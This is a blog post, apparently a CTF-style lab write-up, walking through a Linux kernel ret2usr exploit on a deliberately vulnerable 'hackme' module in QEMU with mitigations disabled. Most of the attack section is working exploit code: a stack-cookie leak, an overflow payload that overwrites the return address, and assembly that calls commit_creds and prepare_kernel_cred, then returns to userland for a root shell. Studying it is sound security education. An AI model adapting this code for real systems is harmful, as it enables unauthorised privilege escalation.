<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Linux Kernel Exploitation Part 1: ret2usr - Arzedlab ğŸªµ</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="This post introduces kernel exploitation fundamentals through the classic ret2usr technique. It explains how attackers redirect kernel execution into userland memory, why this attack was historically common, and how modern mitigations restrict it." />
	<meta property="og:image" content=""/>
	<meta property="og:url" content="http://localhost:1313/posts/kernel-exploitation-ret2usr-part-1-2063648c0bf4802299a9f392ff3c809b/">
  <meta property="og:site_name" content="Arzedlab ğŸªµ">
  <meta property="og:title" content="Linux Kernel Exploitation Part 1: ret2usr">
  <meta property="og:description" content="This post introduces kernel exploitation fundamentals through the classic ret2usr technique. It explains how attackers redirect kernel execution into userland memory, why this attack was historically common, and how modern mitigations restrict it.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-06-05T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-06-05T00:00:00+00:00">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="Kernel">
    <meta property="article:tag" content="SMEP">
    <meta property="article:tag" content="ROP">
    <meta property="article:tag" content="Exploitation">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Linux Kernel Exploitation Part 1: ret2usr">
  <meta name="twitter:description" content="This post introduces kernel exploitation fundamentals through the classic ret2usr technique. It explains how attackers redirect kernel execution into userland memory, why this attack was historically common, and how modern mitigations restrict it.">
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7198d56e4fe53ab4610aa7f913b8d3fa7453003ac7791c64a6d6157aecbbced5.css" />

	
	

	
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">Arzedlab ğŸªµ</a>
	</div>
	<nav>
		
		<a href="/">ğŸ  Home</a>
		
		<a href="/posts">ğŸ—‚ï¸ All posts</a>
		
		<a href="/about">ğŸ’¡ About Me</a>
		
		<a href="/papers">ğŸ“‘ Publications</a>
		
		<a href="/tags">ğŸ·ï¸ Tags</a>
		
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">Linux Kernel Exploitation Part 1: ret2usr</h1>
			<div class="meta">Posted on Jun 5, 2025</div>
		</div>
		

		
		<div class="toc">
		<strong>Table of contents:</strong>
		<nav id="TableOfContents">
  <ul>
    <li><a href="#dive-into-program">Dive into program</a>
      <ul>
        <li><a href="#read">(READ)</a></li>
        <li><a href="#write">(WRITE)</a></li>
        <li><a href="#getting-root-privileges"><strong>Getting root privileges</strong></a></li>
        <li><a href="#returning-to-userland"><strong>Returning to userland</strong></a></li>
        <li><a href="#final-tip">Final Tip</a></li>
      </ul>
    </li>
  </ul>
</nav>
		</div>

		<section class="body">
			<h1 id="kernel-exploitation-ret2usr-part-1">Kernel Exploitation ret2usr Part 1</h1>
<p><strong><code>compress.sh</code>  - To extract compressed image from linux</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>gcc -o exploit -static <span style="color:#8be9fd;font-style:italic">$1</span>
</span></span><span style="display:flex;"><span>mv ./exploit ./initramfs
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> initramfs
</span></span><span style="display:flex;"><span>find . -print0 <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>| cpio --null -ov --format<span style="color:#ff79c6">=</span>newc <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>| gzip -9 &gt; initramfs.cpio.gz
</span></span><span style="display:flex;"><span>mv ./initramfs.cpio.gz ../
</span></span></code></pre></div><p><strong><code>run.sh</code>  - Run qemu configuration</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>qemu-system-x86_64 <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>    -s <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>    -m 128M <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>    -cpu kvm64,+smep,+smap <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>    -kernel vmlinuz <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>    -initrd initramfs.cpio.gz <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>    -hdb flag.txt <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>    -snapshot <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>    -nographic <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>    -monitor /dev/null <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>    -no-reboot <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>    -append <span style="color:#f1fa8c">&#34;console=ttyS0 quiet panic=1 nosmep nosmap nopti nokaslr&#34;</span>
</span></span></code></pre></div><p>As you can see all security mitigations are turned off. <code>-s</code>  flag set for debugging the linux kernel.</p>
<h2 id="dive-into-program">Dive into program</h2>
<h3 id="read">(READ)</h3>
<p>Given the hackme module in linux at <code>/dev/hackme</code></p>
<p>IDA decompiler gives us a clear view, what is the inside of binary. <code>hackme_read</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">ssize_t</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">hackme_read</span>(file <span style="color:#ff79c6">*</span>f, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>data, <span style="color:#8be9fd">size_t</span> size, <span style="color:#8be9fd">loff_t</span> <span style="color:#ff79c6">*</span>off)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v4; <span style="color:#6272a4">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v5; <span style="color:#6272a4">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">bool</span> v6; <span style="color:#6272a4">// zf
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">ssize_t</span> result; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> tmp[<span style="color:#bd93f9">32</span>]; <span style="color:#6272a4">// [rsp+0h] [rbp-A0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v9; <span style="color:#6272a4">// [rsp+80h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">_fentry__</span>(f, data, size, off);
</span></span><span style="display:flex;"><span>  v5 <span style="color:#ff79c6">=</span> v4;
</span></span><span style="display:flex;"><span>  v9 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">__readgsqword</span>(<span style="color:#bd93f9">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">_memcpy</span>(hackme_buf, tmp);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( v5 <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x1000</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">_warn_printk</span>(<span style="color:#f1fa8c">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">4096</span>, v5);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">BUG</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">_check_object_size</span>(hackme_buf, v5, <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>  v6 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">copy_to_user</span>(data, hackme_buf, v5) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  result <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">14</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( v6 )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> v5;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Due to <code>tmp[32]</code> is not initialized. We have arbitrary stack leak of <code>0x80</code> bytes. (<code>0xA0-0x20</code> = <code>0x80</code>). The <code>tmp</code> buffer itself <code>0x80</code> bytes long.</p>
<p><img src="image.png" alt="image.png"></p>
<p>Therefore, if we read the data to aÂ <code>unsigned long</code>Â array (of which each element is 8 bytes), the cookie will be at offset 16:</p>
<p><img src="image%201.png" alt="Leak of the stack buffer"></p>
<p>Leak of the stack buffer</p>
<h3 id="write">(WRITE)</h3>
<p>IDA Decompiler:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">ssize_t</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">hackme_write</span>(file <span style="color:#ff79c6">*</span>f, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>data, <span style="color:#8be9fd">size_t</span> size, <span style="color:#8be9fd">loff_t</span> <span style="color:#ff79c6">*</span>off)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v4; <span style="color:#6272a4">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">ssize_t</span> v5; <span style="color:#6272a4">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> tmp[<span style="color:#bd93f9">32</span>]; <span style="color:#6272a4">// [rsp+0h] [rbp-A0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+80h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">_fentry__</span>(f, data, size, off);
</span></span><span style="display:flex;"><span>  v5 <span style="color:#ff79c6">=</span> v4;
</span></span><span style="display:flex;"><span>  v8 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">__readgsqword</span>(<span style="color:#bd93f9">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( v4 <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x1000</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">_warn_printk</span>(<span style="color:#f1fa8c">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">4096</span>, v4);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">BUG</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">_check_object_size</span>(hackme_buf, v4, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#50fa7b">copy_from_user</span>(hackme_buf, data, v5) )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">14</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">_memcpy</span>(tmp, hackme_buf);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> v5;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>hackme_buf</code> is user-controlled variable, thatâ€™s why the <code>temp</code> stack buffer will be re-written with <code>hackme_buf</code> data.</p>
<p>The situation here is the same as leaking, we will create anÂ <code>unsigned long</code>Â array, then overwrite the cookie with our leaked cookie at index 16.
The important thing to note here is that different fromÂ <code>userland</code>Â programs, this kernel function actually pops 3 registers from the stack, namelyÂ <code>rbx</code>,Â <code>r12</code>,Â <code>rbp</code>Â instead of justÂ <code>rbp</code>Â (this can clearly be seen in the disassembly of the functions). Therefore, we have to put 3 dummy values after the cookie. Then the next value will be the return address that we want our program to return into, which is the function that we will craft on theÂ <code>userland</code>Â to achieve root privileges, I called itÂ <code>escalate_privs</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">overflow</span>(<span style="color:#8be9fd">void</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> n <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">50</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> payload[n];
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> off <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">16</span>;
</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> cookie;
</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// r12
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// rbp
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span>)escalate_privs; <span style="color:#6272a4">// ret
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;[*] Prepared payload&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">ssize_t</span> w <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">write</span>(global_fd, payload, <span style="color:#ff79c6">sizeof</span>(payload));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;[!] Should never be reached&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="getting-root-privileges"><strong>Getting root privileges</strong></h3>
<p>Again, just as a reminder, our goal in kernel exploitation is not to pop a shell viaÂ <code>system(&quot;/bin/sh&quot;)</code>Â orÂ <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>, but it is to achieve root privileges in the system, then pop a root shell. Typically, the most common way to do this is by using the 2 functions calledÂ <code>commit_creds()</code>Â andÂ <code>prepare_kernel_cred()</code>, which are functions that already reside in the kernel-space code itself. What we need to do is to call the 2 functions like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#50fa7b">commit_creds</span>(<span style="color:#50fa7b">prepare_kernel_cred</span>(<span style="color:#bd93f9">0</span>))
</span></span></code></pre></div><p>SinceÂ <code>KASLR</code>Â is disabled, the addresses where these functions reside in is constant across every boot. Therefore, we can just easily get those addresses by readingÂ <code>/proc/kallsyms</code>Â file using these shell commands:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /proc/kallsyms | grep commit_creds
</span></span><span style="display:flex;"><span>-&gt; ffffffff814c6410 T commit_creds
</span></span><span style="display:flex;"><span>cat /proc/kallsyms | grep prepare_kernel_cred
</span></span><span style="display:flex;"><span>-&gt; ffffffff814c67f0 T prepare_kernel_cred
</span></span></code></pre></div><p>Then the code to achieve root privileges can be written as follows (you can write it in many different ways, itâ€™s just simply calling 2 functions consecutively using oneâ€™s return value as the otherâ€™s parameter, I just saw this in a writeup and copied it):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">escalate_privs</span>(<span style="color:#8be9fd">void</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">__asm__</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;.intel_syntax noprefix;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span style="color:#6272a4">//prepare_kernel_cred
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#f1fa8c">&#34;xor rdi, rdi;&#34;</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#f1fa8c">&#34;call rax; mov rdi, rax;&#34;</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#f1fa8c">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span style="color:#6272a4">//commit_creds
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	    <span style="color:#f1fa8c">&#34;call rax;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;swapgs;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15, user_ss;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;push r15;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15, user_sp;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;push r15;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15, user_rflags;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;push r15;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15, user_cs;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;push r15;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15, user_rip;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;push r15;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;iretq;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;.att_syntax;&#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="returning-to-userland"><strong>Returning to userland</strong></h3>
<p>At the current state of the exploitation, if you simply return to aÂ <code>userland</code>Â piece of code to pop a shell, you will be disappointed. The reason is because after running the above code, we are still executing inÂ <code>kernel-mode</code>. In order to open a root shell, we have to return toÂ <code>user-mode</code>.</p>
<p>Basically, if the kernel runs normally, it will return to userland using 1 of these instructions (in x86_64):Â <code>sysretq</code>Â orÂ <code>iretq</code>. The typical way that most people use is throughÂ <code>iretq</code>, because as far as I know,Â <code>sysretq</code>Â is more complicated to get right. TheÂ <code>iretq</code>Â instruction just requires the stack to be setup withÂ <strong>5 userland register values</strong>Â in this order:Â <code>RIP|CS|RFLAGS|SP|SS</code>.</p>
<p>The process keeps track of 2 different sets of values for these registers, one forÂ <code>user-mode</code>Â and one forÂ <code>kernel-mode</code>. Therefore, after finishing executing inÂ <code>kernel-mode</code>, it must revert back to theÂ <code>user-mode</code>Â values for these registers. ForÂ <code>RIP</code>, we can simply set this to be the address of the function that pops a shell. However, for the other registers, if we just set them to be something random, the process may not continue execution as expected. To solve this problem, people have thought of a very clever way:Â <em>save the state of these registers before going into kernel-mode, then reload them after gaining root privileges</em>. The function to save their states is as follow:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">save_state</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">__asm__</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;.intel_syntax noprefix;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov user_cs, cs;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov user_ss, ss;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov user_sp, rsp;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;pushf;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;pop user_rflags;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;.att_syntax;&#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;[*] Saved state&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><hr>
<p>And one more thing, on x86_64, one more instruction calledÂ <code>swapgs</code>Â must be called beforeÂ <code>iretq</code>. The purpose of this instruction is to also swap theÂ <code>GS</code>Â register betweenÂ <code>kernel-mode</code>Â andÂ <code>user-mode</code>. With all those information, we can finish the code to gain root privileges, then return toÂ <code>user-mode</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> user_rip <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span>)get_shell;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">escalate_privs</span>(<span style="color:#8be9fd">void</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">__asm__</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;.intel_syntax noprefix;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span style="color:#6272a4">//prepare_kernel_cred
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#f1fa8c">&#34;xor rdi, rdi;&#34;</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#f1fa8c">&#34;call rax; mov rdi, rax;&#34;</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#f1fa8c">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span style="color:#6272a4">//commit_creds
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	    <span style="color:#f1fa8c">&#34;call rax;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;swapgs;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15, user_ss;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;push r15;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15, user_sp;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;push r15;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15, user_rflags;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;push r15;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15, user_cs;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;push r15;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r15, user_rip;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;push r15;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;iretq;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;.att_syntax;&#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><hr>
<p>We can finally call those pieces that we have crafted one by one, in the correct order, to open a root shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">save_state</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">open_dev</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">leak</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">overflow</span>();  
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;[!] Should never be reached&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><hr>
<h3 id="final-tip">Final Tip</h3>
<p>Once you verify chain leads to <code>swapgs; iretq</code> (or similar) and returns to userland shell, you can validate success by checking <code>id</code></p>

		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/linux">linux</a></li>
					
					<li><a href="/tags/kernel">kernel</a></li>
					
					<li><a href="/tags/smep">SMEP</a></li>
					
					<li><a href="/tags/rop">rop</a></li>
					
					<li><a href="/tags/exploitation">exploitation</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/arzedlab/" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/ravshan-rikhsiev/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
    <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2025  Â© Ravshan | Made with Love â¤ï¸ <a href="https://twitter.com/arzedlab/"> My Twitter ğŸª½</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
